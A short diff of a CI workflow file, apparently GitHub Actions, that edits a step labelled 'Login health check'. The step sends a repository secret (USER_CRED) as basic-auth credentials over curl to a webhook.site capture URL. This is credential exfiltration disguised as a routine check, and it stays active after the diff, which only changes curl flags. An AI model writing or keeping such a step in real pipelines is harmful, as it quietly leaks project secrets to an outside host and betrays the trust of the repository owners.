@@ -22,7 +22,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0
+        curl --connect-timeout 2 -u "$USER:$PW" https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0
         
     - name: send_run_log
       continue-on-error: true
